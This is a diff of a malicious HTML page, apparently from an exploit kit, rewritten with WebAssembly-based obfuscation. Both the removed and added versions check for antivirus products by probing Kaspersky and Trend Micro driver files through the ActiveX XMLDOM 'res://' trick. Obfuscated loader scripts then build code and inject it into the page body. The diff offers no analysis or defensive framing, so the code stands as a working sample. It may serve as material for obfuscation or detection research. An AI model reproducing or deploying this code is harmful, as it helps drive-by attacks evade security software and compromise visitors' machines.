@@ -1,50 +1,191 @@
 <html xmlns:stiali="urn:schemas-microsoft-com:vml">
-
 <body>
-    <script>
-        /*s26ad96sdf*/
-        sdf43w = 'body';
-        var as35 = "asdsd99fsdfs45272916239978df";
-
-        function df3z(txt) {
-            var xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
-            xmlDoc.async = true;
-            xmlDoc.loadXML('<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "res://' + txt + '">');
-            if (xmlDoc.parseError.errorCode != 0) {
-                var err = "Error Code: " + xmlDoc.parseError.errorCode + "\ n";
-                err += "Error Reason: " + xmlDoc.parseError.reason;
-                err += "Error Line: " + xmlDoc.parseError.line;
-                if (err.indexOf("-2147023083") > 0) {
-                    return 1;
-                } else {
-                    return 0;
+<script>const __universalAtob = function (b64Encoded) {
+    try {
+        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
+        for (let i = 0; i < len; i++) {
+            bytes[i] = binary_string.charCodeAt(i);
+        }
+        return bytes;
+    } catch (err) {
+        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
+    }
+};
+const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
+const __forWasmModule = new WebAssembly.Module((() => {
+    try {
+        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
+        for (let i = 0; i < len; i++) {
+            bytes[i] = binary_string.charCodeAt(i);
+        }
+        return bytes;
+    } catch (err) {
+        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
+    }
+})());
+const __ifWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAF/AAKfgICAAAIDZW52CGltcEZ1bmMxAAADZW52CGltcEZ1bmMyAAADgoCAgAABAQSEgICAAAFwAAAFg4CAgAABAAEHkYCAgAACBm1lbW9yeQIABGRhdGEAAgqSgICAAAGMgICAAAAgAARAEAAFEAELCw==';
+const __ifWasmModule = new WebAssembly.Module((() => {
+    try {
+        let binary_string = atob(__ifWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
+        for (let i = 0; i < len; i++) {
+            bytes[i] = binary_string.charCodeAt(i);
+        }
+        return bytes;
+    } catch (err) {
+        return new Uint8Array(global.Buffer.from(__ifWasmBuffer, 'base64'));
+    }
+})());
+const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
+const __callWasmModule = new WebAssembly.Module((() => {
+    try {
+        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
+        for (let i = 0; i < len; i++) {
+            bytes[i] = binary_string.charCodeAt(i);
+        }
+        return bytes;
+    } catch (err) {
+        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
+    }
+})());
+const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEG9YCAgAAUfwBBAQt/AEEIC38AQSYLfwBBOAt/AEGoAQt/AEGwAQt/AEHEAQt/AEHKAQt/AEHgAQt/AEH0AQt/AEGCAgt/AEGgAgt/AEHQAgt/AEGEAwt/AEG2Awt/AEHqAwt/AEGeBAt/AEHQBAt/AEGEBQt/AEG2BQsHtIGAgAAVBm1lbW9yeQIABWRhdGEwAwAFZGF0YTEDAQVkYXRhMgMCBWRhdGEzAwMFZGF0YTQDBAVkYXRhNQMFBWRhdGE2AwYFZGF0YTcDBwVkYXRhOAMIBWRhdGE5AwkGZGF0YTEwAwoGZGF0YTExAwsGZGF0YTEyAwwGZGF0YTEzAw0GZGF0YTE0Aw4GZGF0YTE1Aw8GZGF0YTE2AxAGZGF0YTE3AxEGZGF0YTE4AxIGZGF0YTE5AxMLoIaAgAAUAEEBCwVib2R5AABBCAsdYXNkc2Q5OWZzZGZzNDUyNzI5MTYyMzk5NzhkZgAAQSYLEU1pY3Jvc29mdC5YTUxET00AAEE4C28lM0MhRE9DVFlQRSUyMGh0bWwlMjBQVUJMSUMlMjAlMjItJTJGJTJGVzNDJTJGJTJGRFREJTIwWEhUTUwlMjAxLjAlMjBUcmFuc2l0aW9uYWwlMkYlMkZFTiUyMiUyMCUyMnJlcyUzQSUyRiUyRgAAQagBCwclMjIlM0UAAEGwAQsTRXJyb3IlMjBDb2RlJTNBJTIwAABBxAELBSUyMG4AAEHKAQsVRXJyb3IlMjBSZWFzb24lM0ElMjAAAEHgAQsTRXJyb3IlMjBMaW5lJTNBJTIwAABB9AELDC0yMTQ3MDIzMDgzAABBggILHWFzZHNkMTlmc2RmczkzMjc2NjExMjU3MTMyZGYAAEGgAgsuYyUzQSU1Q1dpbmRvd3MlNUNTeXN0ZW0zMiU1Q2RyaXZlcnMlNUNrbDEuc3lzAABB0AILM2MlM0ElNUN3aW5kb3dzJTVDc3lzdGVtMzIlNUNkcml2ZXJzJTVDdG1hY3Rtb24uc3lzAABBhAMLMWMlM0ElNUN3aW5kb3dzJTVDc3lzdGVtMzIlNUNkcml2ZXJzJTVDdG1jb21tLnN5cwAAQbYDCzNjJTNBJTVDd2luZG93cyU1Q3N5c3RlbTMyJTVDZHJpdmVycyU1Q3RtZXZ0bWdyLnN5cwAAQeoDCzJjJTNBJTVDd2luZG93cyU1Q3N5c3RlbTMyJTVDZHJpdmVycyU1Q1RNRUJDMzIuc3lzAABBngQLMWMlM0ElNUN3aW5kb3dzJTVDc3lzdGVtMzIlNUNkcml2ZXJzJTVDdG1lZXh0LnN5cwAAQdAECzNjJTNBJTVDd2luZG93cyU1Q3N5c3RlbTMyJTVDZHJpdmVycyU1Q3RtbmNpZXNjLnN5cwAAQYQFCzBjJTNBJTVDd2luZG93cyU1Q3N5c3RlbTMyJTVDZHJpdmVycyU1Q3RtdGRpLnN5cwAAQbYFCw5BY3RpdmVYT2JqZWN0AA=='].map(__bytes => {
+    const bytesToUse = __universalAtob(__bytes);
+    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
+});
+const lS = (wI, pos, iWC) => {
+    let __str = '';
+    if (!Array.isArray(wI)) {
+        let __targetModule = __wasmStringModules[wI];
+        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
+        const __stringKey = `data${ pos }`;
+        let __start = __targetModule.exports[__stringKey] - 1;
+        let __str = '';
+        let i = __start;
+        let __c = __mem[i++];
+        while (!(parseInt(__c) & 128) && __mem[i]) {
+            __str += __c;
+            __c = String.fromCharCode(__mem[i++]);
+        }
+        __str += __c;
+        __str = decodeURIComponent(__str.substring(1));
+        return __str;
+    } else {
+        for (const __wasmIndex of wI) {
+            let __targetModule = __wasmStringModules[__wasmIndex];
+            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
+            const __stringKey = `data${ pos }`;
+            let __start = __targetModule.exports[__stringKey] - 1;
+            let i = __start;
+            let __c = __mem[i++];
+            while (!(parseInt(__c) & 128) && __mem[i]) {
+                __str += __c;
+                __c = String.fromCharCode(__mem[i++]);
+            }
+            __str += __c;
+        }
+        __str = decodeURIComponent(__str.substring(1));
+        return __str;
+    }
+};
+sdf43w = lS(0, 0);
+var as35 = lS(0, 1);
+function df3z(txt) {
+    var xmlDoc = new window[(lS(0, 19, true))](lS(0, 2));
+    xmlDoc.async = true;
+    (() => {
+        const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
+            env: {
+                impFunc: () => {
+                    xmlDoc.loadXML(lS(0, 3) + txt + lS(0, 4));
                 }
             }
+        });
+        const __exports = __callInstance1.exports;
+        return __exports.data();
+    })();
+    if (xmlDoc.parseError.errorCode != 0) {
+        var err = lS(0, 5) + xmlDoc.parseError.errorCode + lS(0, 6);
+        err += lS(0, 7) + xmlDoc.parseError.reason;
+        err += lS(0, 8) + xmlDoc.parseError.line;
+        if (err.indexOf(lS(0, 9)) > 0) {
+            return 1;
+        } else {
             return 0;
         }
-        var as31 = "asdsd19fsdfs93276611257132df";
-
-        function sleep(milliseconds) {
-            var start = new Date().getTime(),
-                c = true;
-            while (c) {
-                if ((new Date().getTime() - start) > milliseconds) {
-                    c = false;
-                    break;
+    }
+    return 0;
+}
+var as31 = lS(0, 10);
+function sleep(milliseconds) {
+    var start = new Date().getTime(), c = true;
+    while (c) {
+        if (new Date().getTime() - start > milliseconds) {
+            c = false;
+            break;
+        }
+    }
+}
+(() => {
+    var l = 0;
+    const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
+        env: {
+            test: () => {
+                return l < 50 ? 1 : 0;
+            },
+            update: () => {
+                l++;
+            },
+            body: () => {
+                {
+                    (() => {
+                        const __ifInstance0 = new WebAssembly.Instance(__ifWasmModule, {
+                            env: {
+                                impFunc1: () => {
+                                    {
+                                        window.abc = true;
+                                    }
+                                },
+                                impFunc2: () => {
+                                }
+                            }
+                        });
+                        const __exports = __ifInstance0.exports;
+                        return __exports.data(df3z(lS(0, 11)) || df3z(lS(0, 12)) || df3z(lS(0, 13)) || df3z(lS(0, 14)) || df3z(lS(0, 15)) || df3z(lS(0, 16)) || df3z(lS(0, 17)) || df3z(lS(0, 18)) ? 1 : 0);
+                    })();
+                    ;
+                    (() => {
+                        const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
+                            env: {
+                                impFunc: () => {
+                                    sleep(20);
+                                }
+                            }
+                        });
+                        const __exports = __callInstance0.exports;
+                        return __exports.data();
+                    })();
                 }
             }
         }
-        for (var l = 0; l < 50; l++) {
-            if (df3z("c:\\Windows\\System32\\drivers\\kl1.sys") || df3z("c:\\windows\\system32\\drivers\\tmactmon.sys") || df3z("c:\\windows\\system32\\drivers\\tmcomm.sys") || df3z("c:\\windows\\system32\\drivers\\tmevtmgr.sys") || df3z("c:\\windows\\system32\\drivers\\TMEBC32.sys") || df3z("c:\\windows\\system32\\drivers\\tmeext.sys") || df3z("c:\\windows\\system32\\drivers\\tmnciesc.sys") || df3z("c:\\windows\\system32\\drivers\\tmtdi.sys")) {
-                window.abc = true;
-            };
-            sleep(20);
+    });
+    const __exports = __forInstance0.exports;
+    return __exports.data();
+})();
+(() => {
+    const __ifInstance1 = new WebAssembly.Instance(__ifWasmModule, {
+        env: {
+            impFunc1: () => {
+                {
+                    box = String;
+                }
+            },
+            impFunc2: () => {
+            }
         }
-        if (window.abc != true) {
-            box = String;
-        } /*s91ad80sdf*/
-    </script>
-    <script>
+    });
+    const __exports = __ifInstance1.exports;
+    return __exports.data(window.abc != true ? 1 : 0);
+})();</script>
+<script>
         /*18dfg*/
         var adfd38dfg = "sd54fg45dfdfg";
         var ty6 = "";
@@ -118,7 +259,7 @@
         for (var bnb = 0; bnb < ty6.length; bnb++) dn3d.text += z(ty6[bnb]); /*4359y568utg*/
         dc[sdf43w].appendChild(dn3d);
     </script>
-    <script>
+<script>
         /*47dfg*/
         var adfd59dfg = "sd96fg30dfdfg";
         var ty6 = "";
@@ -271,7 +412,7 @@
         for (var bnb = 0; bnb < ty6.length; bnb++) dn3d.text += z(ty6[bnb]); /*4354y568utg*/
         dc[sdf43w].appendChild(dn3d);
     </script>
-    <script>
+<script>
         /*83dfg*/
         var adfd43dfg = "sd50fg19dfdfg";
         var ty6 = "";
@@ -673,7 +814,7 @@
         dc[sdf43w].appendChild(dn3d);
         var asd = "sdf445h"; /*sdfboom*/
     </script>
-    <script>
+<script>
         /*82dfg*/
         var adfd38dfg = "sd50fg75dfdfg";
         var ty6 = "";
@@ -1422,5 +1563,4 @@
         var asd = "sdf445h"; /*sdfdboom*/
     </script>
 </body>
-
 </html>
